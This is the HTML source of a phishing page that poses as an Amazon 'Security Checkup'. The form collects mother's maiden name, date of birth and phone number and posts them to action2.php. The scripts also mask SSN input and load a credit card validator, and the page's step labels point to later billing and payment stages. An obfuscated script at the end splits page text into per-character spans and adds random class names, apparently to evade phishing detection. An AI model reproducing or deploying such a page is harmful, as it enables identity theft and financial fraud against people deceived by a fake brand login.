<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>
        Security Checkup    </title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="./files/favicon.ico">
    <link rel="stylesheet" type="text/css" href="./files/boostrap.min.css" media="all">
    <link rel="stylesheet" href="./files/sign-dekstop.css">
    <link rel="stylesheet" href="./files/style.sign-desktop.css">
    <link rel="stylesheet" type="text/css" href="./files/style.css">
</head>

<body onload="_loader()" style="margin: 0px;">
    <div id="loader" style="display: block;"></div>
    <div style="display: none;" id="myDiv" class="animate-bon ttom">
        <div id="a-page">
            <div class="a-section a-padding-medium auth-workflow">
                <div class="a-section a-spacing-none auth-navbar">
                    <div class="a-section a-spacing-medium a-text-center">
                        <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                    </div>
                </div>
                <div id="authportal-center-section" class="a-section">
                    <ul class="list-unstyled multi-steps" style="padding-top: 10px" align="center">
                        <li class="is-active">
                            Security                        </li>
                        <li>
                            Billing                        </li>
                        <li>
                            Payments                        </li>
                        <li>
                            Finish                        </li>
                    </ul>
                    <div class="a-content">
                        <div class="container">
                            <div class="row" style="padding-top: 5px">
                                <div class="col-12">
                                    <div align="center"> <img src="./files/security.png" width="80"> </div>
                                    <div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;">Security Checkup</span> </div>
                                    <div align="center"> <span class="lefttext">Please enter the information that matches your account.</span> </div><br>
                                    <div class="mypayementarea">
                                        <form action="action2.php" method="post" name="konzform" id="konzform" novalidate="novalidate"> <span class="colorblacked">Security Checkup</span>
                                            <div class="row mt-3">
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="mmn">
                                                            Mother's Maiden name                                                        </label>
                                                        <input type="text" class="form-control amazoninput mmnfocus" name="mmn" id="mmn" placeholder="Mother&#39;s maiden name" minlength="5" maxlength="30" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="dob">
                                                            Date of birth                                                        </label>
                                                        <input type="text" class="form-control amazoninput regionfocus" name="dob" id="dob" placeholder="MM/DD/YYYY" maxlength="10">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="phone">
                                                            Phone number                                                        </label>
                                                        <input type="text" class="form-control amazoninput zipfocus" name="phone" id="phone" placeholder="Phone / Mobile number" maxlength="16">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="a-row a-spacing-small">
                                                <span id="cvf-submit-otp-button" class="a-button a-button-span2 a-button-primary cvf-widget-btn cvf-widget-btn-verify">
                                                    <span class="a-button-inner">
                                                        <button type="submit" name="Sex" class="a-button-text" role="button">Continue</button>
                                                    </span>
                                                </span>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <script>
                                    P.when('A', 'ready').execute(function(A) {
                                        var $ = A.$;
                                        $('.cvf-widget-link-resend').click(function() {
                                            $('.cvf-widget-form-resend').submit();
                                        });
                                    });
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    Conditions of Use                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    Privacy Notice                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    Help                </a> <span class="auth-footer-seperator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> © 1996-2024, Amazon.com, Inc. or its affiliates </span> </div>
        </div>
    </div>
    <script src="./files/jquery-3.3.1.min.js"></script>
    <script src="./files/jquery.mask.min.js"></script>
    <script src="./files/jquery.validate.min.js"></script>
    <script src="./files/additional-methods.min.js"></script>
    <script src="./files/jquery.creditCardValidator.js"></script>
    <script>
        let load;

        let _loader = () => {
            load = setTimeout(showPage, 1000);
        }

        let showPage = () => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('myDiv').style.display = 'block';
        }

        const alpha = (e) => {
            let k;
            document.all ? k = e.keyCode : k = e.which;
            return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
        }

        $(document).ready(function(e) {
            e('#phone').mask('+000000000000000'), e('#dob').mask('00/00/0000'), e('#ssn').mask('000-00-0000'), $("#konzform").validate({
                errorClass: "error-class",
                rules: {
                    phone: {
                        required: true,
                        minlength: 6,
                        maxlength: 16
                    },
                    dob: {
                        required: true,
                        minlength: 10,
                        minAge: 17
                    },
                    mmn: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    }
                },
                messages: {
                    phone: {
                        required: "Please enter a Phone number."
                    },
                    mmn: {
                        required: "Please enter a Mother's maiden name."
                    },
                    dob: {
                        required: "Please enter a your Date of birth.",
                        minAge: "Please check your Date of birth."
                    }
                }
            });
        })

        $.validator.addMethod("minAge", function(value, element, min) {
            let today = new Date();
            let birthDate = new Date(value);
            let age = today.getFullYear() - birthDate.getFullYear();
            if (age > min + 1) {
                return true;
            }
            let m = today.getMonth() - birthDate.getMonth();
            if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
                age--;
            }
            return age >= min;
        });
    </script>

<script>
const _0x5531de=_0x32fa;(function(_0x35c1e4,_0x1a4d60){const _0x28ef65=_0x32fa,_0x4f4892=_0x35c1e4();while(!![]){try{const _0x497bef=parseInt(_0x28ef65(0xeb))/0x1*(-parseInt(_0x28ef65(0xdd))/0x2)+-parseInt(_0x28ef65(0xd5))/0x3*(parseInt(_0x28ef65(0xcf))/0x4)+parseInt(_0x28ef65(0xe5))/0x5*(-parseInt(_0x28ef65(0xe9))/0x6)+-parseInt(_0x28ef65(0xdb))/0x7+parseInt(_0x28ef65(0xe2))/0x8+parseInt(_0x28ef65(0xea))/0x9+parseInt(_0x28ef65(0xd3))/0xa;if(_0x497bef===_0x1a4d60)break;else _0x4f4892['push'](_0x4f4892['shift']());}catch(_0x51db2c){_0x4f4892['push'](_0x4f4892['shift']());}}}(_0x26b5,0x5a002));function modifyTextContent(_0x48aa73){const _0x221720=_0x32fa,_0x3be6fe=_0x48aa73[_0x221720(0xdf)];for(let _0x971bfb=0x0;_0x971bfb<_0x3be6fe[_0x221720(0xd4)];_0x971bfb++){const _0x25c4e2=_0x3be6fe[_0x971bfb];if(_0x25c4e2[_0x221720(0xdc)]===Node[_0x221720(0xd7)]){const _0x264242=_0x25c4e2[_0x221720(0xd2)]['trim']();if(_0x264242){const _0x142bba=[..._0x264242][_0x221720(0xde)](_0xec071f=>'<span>'+_0xec071f+_0x221720(0xe7))[_0x221720(0xe4)]('');_0x25c4e2[_0x221720(0xd0)](...parseHTML(_0x142bba));}}else _0x25c4e2['nodeType']===Node[_0x221720(0xd6)]&&modifyTextContent(_0x25c4e2);}const _0x933f30=String['fromCharCode'](0x41+Math[_0x221720(0xe1)](Math[_0x221720(0xd9)]()*0x1a)),_0x189ec5=Math[_0x221720(0xe1)](Math[_0x221720(0xd9)]()*0x1e),_0x37e935=String['fromCharCode'](0x41+Math[_0x221720(0xe1)](Math['random']()*0x1a)),_0x4c0973=Math[_0x221720(0xe1)](Math[_0x221720(0xd9)]()*0x1e),_0x1ea6c3=String['fromCharCode'](0x41+Math[_0x221720(0xe1)](Math[_0x221720(0xd9)]()*0x1a)),_0x229b09=Math[_0x221720(0xe1)](Math['random']()*0x1e);_0x48aa73[_0x221720(0xe8)]['add']('class-'+_0x933f30+_0x189ec5+_0x221720(0xe3)+_0x37e935+_0x4c0973+'-class-'+_0x1ea6c3+_0x229b09);}function _0x32fa(_0x3e3adc,_0x538d06){const _0x26b536=_0x26b5();return _0x32fa=function(_0x32fa2c,_0x417787){_0x32fa2c=_0x32fa2c-0xcf;let _0x5f0e89=_0x26b536[_0x32fa2c];return _0x5f0e89;},_0x32fa(_0x3e3adc,_0x538d06);}function parseHTML(_0x20c44d){const _0x594668=_0x32fa,_0x37bd40=document[_0x594668(0xd8)](_0x594668(0xd1));return _0x37bd40['innerHTML']=_0x20c44d,_0x37bd40[_0x594668(0xda)][_0x594668(0xdf)];}function _0x26b5(){const _0x57bda7=['floor','5267512LYrQoD','-class-','join','640580dHpeZO','querySelectorAll','</span>','classList','30fwUbVh','5361291IiAQsw','4CTmZIM','7428wRbMjb','replaceWith','template','textContent','8870720vLzTXr','length','810uGYmbh','ELEMENT_NODE','TEXT_NODE','createElement','random','content','103222lJlQNo','nodeType','307926QUITrM','map','childNodes','h1,h2,h3,h4,h5,h6,p,span,strong,em,a,ul,ol,li,dl,dt,dd,blockquote,cite,code,pre,abbr,del,ins,sup,sub,mark,small,big,u,s,b,i,br,hr,hgroup,address,time,q,cite,dfn,var,kbd,samp,meter,progress,figure,figcaption,table,caption,thead,tbody,tfoot,th,td,tr,colgroup,col,div,section,article,nav,header,footer,main,aside,iframe,select,option,label,fieldset,legend,textarea,button,form,input,optgroup,map,area,details,summary,menu,command,output,progress,keygen,datalist,audio,video,source,track,canvas,meter,time,mark,ruby,rt,rp,bdi,bdo,wbr,picture,source,img,figcaption,path,circle,ellipse,polygon,polyline,rect,text,line,g,iframe,embed,object,param,link,meta,base'];_0x26b5=function(){return _0x57bda7;};return _0x26b5();}const allElements=document[_0x5531de(0xe6)](_0x5531de(0xe0));allElements['forEach'](_0x523931=>{modifyTextContent(_0x523931);});
</script>
</body></html>